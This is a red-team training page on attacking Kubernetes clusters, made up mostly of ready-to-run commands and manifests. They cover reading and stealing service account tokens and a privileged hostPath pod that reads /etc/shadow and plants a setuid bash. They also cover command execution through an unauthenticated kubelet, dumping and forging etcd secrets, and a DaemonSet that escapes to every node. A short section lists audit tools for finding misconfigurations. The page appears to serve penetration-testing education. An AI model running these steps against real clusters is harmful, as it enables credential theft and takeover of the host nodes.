---
layout: training-page
title: "Kubernetes Security Attacks — Red Team Academy"
module: "Red Team Tools"
tags:
  - kubernetes
  - k8s
  - rbac-abuse
  - pod-escape
  - etcd
  - api-server
  - service-account
page_key: "tools-kubernetes-security"
render_with_liquid: false
---

# Kubernetes Security Attacks

Kubernetes attack surface spans the API server, etcd, kubelet, service account tokens, RBAC misconfigurations, and network policies. Attackers typically start by compromising a pod, then escalate through misconfigured RBAC, service account tokens, or privileged containers to gain cluster-admin access and control the underlying host nodes.

## Initial Recon — From Inside a Pod

```
# Confirm Kubernetes environment:
env | grep -iE "(KUBERNETES|K8S|POD|NAMESPACE)"
cat /run/secrets/kubernetes.io/serviceaccount/namespace
cat /run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes API server address (from env):
echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT
# Default: 10.96.0.1:443 or kubernetes.default.svc.cluster.local

# Set up API access from inside pod:
APISERVER="https://kubernetes.default.svc"
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Test what the service account can do:
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/pods" | python3 -m json.tool

# Use kubectl if available:
kubectl auth can-i --list --token=$TOKEN
kubectl get pods --token=$TOKEN
kubectl get secrets --token=$TOKEN
```

## RBAC Abuse and Privilege Escalation

```
# Enumerate what the current service account can do:
kubectl auth can-i --list
# Look for: get/list/create/delete on pods, secrets, deployments, clusterroles

# High-value permissions to look for:
# create pods → run privileged pod → escape to node
# get/list secrets → read all cluster secrets including credentials
# patch/update deployments → inject code into running workloads
# bind clusterroles → grant yourself cluster-admin
# impersonate → act as other service accounts

# If you can create pods — launch privileged pod with host mount:
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: priv-escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","chroot /host sh -c 'id; cat /etc/shadow; cp /bin/bash /tmp/bash; chmod +s /tmp/bash'"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  restartPolicy: Never
EOF

# Check pod output:
kubectl logs priv-escape

# Read all secrets in a namespace:
kubectl get secrets -o yaml
# Look for database passwords, API keys, TLS certs

# Escalate via impersonation if available:
kubectl auth can-i create pods --as=system:serviceaccount:kube-system:default
```

## Service Account Token Attacks

```
# Service account tokens are auto-mounted at /run/secrets/kubernetes.io/serviceaccount/
# In older K8s (<1.21): tokens never expire
# In newer K8s: projected tokens with expiry, but many pods still use legacy tokens

# Find all service account tokens across the cluster (from cluster-admin):
kubectl get secrets -A | grep service-account-token
kubectl get secret SA_SECRET_NAME -n NAMESPACE -o yaml | \
  grep "token:" | awk '{print $2}' | base64 -d

# Decode a service account token (JWT):
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | cut -d. -f2 | base64 -d | python3 -m json.tool
# See: namespace, service account name, expiry

# Steal tokens from other pods (if you can exec into them):
kubectl exec -it OTHER_POD -- cat /run/secrets/kubernetes.io/serviceaccount/token

# Or steal from pod environment variables:
kubectl exec -it OTHER_POD -- env | grep -i token

# Use stolen privileged token:
kubectl --token=$STOLEN_TOKEN get pods -A
kubectl --token=$STOLEN_TOKEN get secrets -A
```

## API Server Attacks

```
# Kubernetes default ports (scan for exposed API server):
# 6443 — Kubernetes API (HTTPS)
# 8080 — Kubernetes API (HTTP, insecure, often localhost-only)
# 2379-2380 — etcd
# 10250 — Kubelet API (HTTPS)
# 10255 — Read-Only Kubelet API (HTTP, often open)

nmap -sV -p 6443,8080,2379,10250,10255 TARGET_HOST

# Unauthenticated API server (anonymous access enabled):
curl -sk https://TARGET:6443/api/v1/pods
curl -sk https://TARGET:6443/api/v1/secrets

# Check if anonymous auth is enabled:
curl -sk https://TARGET:6443/apis | head -20
# If response contains API info without auth → anonymous access enabled

# Port 10255 read-only Kubelet (often no auth):
curl http://TARGET:10255/pods | python3 -m json.tool
curl http://TARGET:10255/metrics

# Port 10250 Kubelet with no auth:
curl -sk https://TARGET:10250/pods
# Execute command in running container via Kubelet API:
curl -sk https://TARGET:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"
```

## etcd Attacks

etcd stores all cluster state including secrets in plaintext. Write access to etcd equals cluster-admin.

```
# etcd default ports: 2379 (client), 2380 (peer)
# Access etcd directly (if reachable without auth):
etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only

# Read all secrets from etcd:
etcdctl --endpoints=http://TARGET:2379 \
  get /registry/secrets --prefix

# Decode base64-encoded secret values:
etcdctl --endpoints=http://TARGET:2379 \
  get /registry/secrets/default/my-secret | strings

# Write to etcd → bypass API server validation:
# Create a new admin user by writing directly to etcd
etcdctl --endpoints=http://TARGET:2379 \
  put /registry/secrets/kube-system/admin-token '{"kind":"Secret","apiVersion":"v1","metadata":{"name":"admin-token","namespace":"kube-system"},"data":{"token":"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltRmliR0k9"},"type":"kubernetes.io/service-account-token"}'

# If etcd requires TLS client certs (typical):
etcdctl --endpoints=https://TARGET:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

## Kubernetes Dashboard Attacks

```
# Check for exposed dashboard:
kubectl get services -A | grep dashboard
# Or scan: nmap -p 30000-32767 TARGET  (NodePort range)

# Bypass dashboard authentication (misconfigured deployments):
# Access /api/v1/namespaces/kubernetes-dashboard/secrets/
# Look for kubernetes-dashboard-token secret

# Dashboard with cluster-admin service account (very common misconfiguration):
kubectl get clusterrolebindings | grep dashboard
# If kubernetes-dashboard has cluster-admin → full cluster access via dashboard

# Skip login (if skip button enabled):
# Navigate to: https://DASHBOARD_URL/#/login
# Click "Skip" button → unauthenticated access

# Token-based dashboard access:
# Get token for a highly-privileged service account:
kubectl -n kubernetes-dashboard create token admin-user 2>/dev/null || \
  kubectl -n kube-system get secret $(kubectl -n kube-system get sa default -o jsonpath="{.secrets[0].name}") \
  -o jsonpath="{.data.token}" | base64 -d
```

## Network Policy Bypass

```
# Enumerate network policies:
kubectl get networkpolicies -A
kubectl describe networkpolicy POLICY_NAME

# If no network policies: all pods can communicate freely
# Attack: pivot between namespaces, reach internal services

# DNS-based service discovery (from inside any pod):
nslookup kubernetes.default
nslookup SERVICENAME.NAMESPACE.svc.cluster.local
# Format: service.namespace.svc.cluster.local

# Port scan internal services:
# K8s services visible in /etc/hosts or via DNS:
cat /etc/hosts
env | grep -i "_PORT\|_HOST"

# Scan internal cluster CIDR:
# Default service CIDR: 10.96.0.0/12
# Default pod CIDR: 192.168.0.0/16 or 10.244.0.0/16
nmap -sV 10.96.0.0/12 2>/dev/null
# Or use masscan for speed
```

## Misconfiguration Detection

```
# kube-bench — CIS Kubernetes benchmark:
docker run --pid=host --net=host --privileged \
  -v /etc:/etc:ro -v /var:/var:ro -v /proc:/proc:ro \
  aquasecurity/kube-bench:latest

# kubeaudit — security audit:
kubeaudit all  # run all checks
kubeaudit privileged  # check for privileged containers
kubeaudit caps  # check capability escalation

# kubesec.io — static analysis of K8s manifests:
kubesec scan pod.yaml

# Polaris — configuration validation:
kubectl apply -f https://github.com/FairwindsOps/polaris/releases/latest/download/dashboard.yaml

# Check for pods without security context:
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.securityContext == null) | .metadata.name'

# Check for pods with hostPath mounts:
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.volumes[] | .hostPath != null) | .metadata.name'

# Check for service accounts with mounted tokens:
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.automountServiceAccountToken != false) | .metadata.name'
```

## Container Escape to Node (from K8s Pod)

```
# If pod is privileged or has dangerous capabilities:
# See /tools/docker-security/ for container escape techniques

# Node shell via kubectl debug (cluster-admin):
kubectl debug node/NODE_NAME -it --image=ubuntu

# DaemonSet abuse — deploy to every node:
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-shell
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-shell
  template:
    metadata:
      labels:
        app: node-shell
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      tolerations:
      - operator: Exists
      containers:
      - name: node-shell
        image: alpine
        command: ["/bin/sh","-c","nsenter -t 1 -m -u -n -i -- sh -c 'id; cat /etc/shadow'"]
        securityContext:
          privileged: true
EOF

kubectl logs -l app=node-shell -n kube-system
```

## Tools

- kube-bench — `github.com/aquasecurity/kube-bench` — CIS benchmark
- kubeaudit — `github.com/Shopify/kubeaudit`
- kubesec — `kubesec.io`
- kubectl — standard Kubernetes CLI
- etcdctl — `github.com/etcd-io/etcd`
- KubeSploit — `github.com/cyberark/KubeSploit`
- peirates — `github.com/inguardians/peirates` — K8s penetration testing tool

## Resources

- OWASP Kubernetes Security Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html`
- CNCF Kubernetes Security White Paper — `github.com/cncf/tag-security`
- HackTricks Kubernetes — `book.hacktricks.xyz/cloud-security/pentesting-kubernetes`
- Tesla K8s cryptomining breach — `arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked`
- Kubernetes attack matrix — `microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes`
